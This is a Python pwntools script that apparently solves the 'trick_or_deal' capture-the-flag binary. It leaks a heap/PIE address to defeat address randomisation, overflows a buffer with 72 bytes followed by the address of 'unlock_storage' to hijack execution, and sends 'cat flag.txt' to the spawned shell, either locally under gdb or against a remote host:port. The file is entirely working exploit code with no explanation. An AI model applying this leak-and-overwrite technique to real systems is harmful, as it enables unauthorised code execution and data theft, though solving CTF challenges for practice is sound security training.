#!/usr/bin/env python3



from pwn import *
import sys

def exploit(io, elf):

    # leak pie base
    io.sendlineafter(b"? ", b"2")
    io.sendafter(b"? ", b"A"*8)
    io.recvuntil(b"A"*8)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    elf.address = leak - 0x15e2
    print("pie_base: ", hex(elf.address))
    
    io.sendlineafter(b"? ", b"4")
    io.sendlineafter(b"? ", b"3")
    io.sendlineafter(b"(y/n): ", b"y")
    io.sendlineafter(b"? ", b"80")
    payload = b"A"*72 + p64(elf.symbols["unlock_storage"])
    io.send(payload)
    
    io.sendlineafter(b"? ", b"1")
    io.sendlineafter(b"Opened *", b"cat flag.txt")
    io.recv()
    flag = io.recv().decode()
    print(flag)

def main():
    if  sys.argv[1] == "debug":
        io = gdb.debug("./trick_or_deal")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    elf = ELF("./trick_or_deal")
    exploit(io, elf)

if __name__ == "__main__":
    main()
